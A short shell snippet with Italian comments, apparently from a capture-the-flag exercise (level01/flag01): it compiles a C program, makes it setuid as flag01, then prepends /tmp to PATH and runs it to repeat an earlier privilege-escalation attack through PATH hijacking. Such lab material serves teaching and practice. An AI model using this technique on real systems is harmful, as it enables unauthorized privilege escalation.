gcc -o flag01-env level1-env.c
#settiamo i privilegi su flag01-env
chown flag01:level01 ./flag01-env
chmod u+s ./flag01-env
#eseguiamo l'attacco precedente
PATH=/tmp:$PATH
./flag01-env
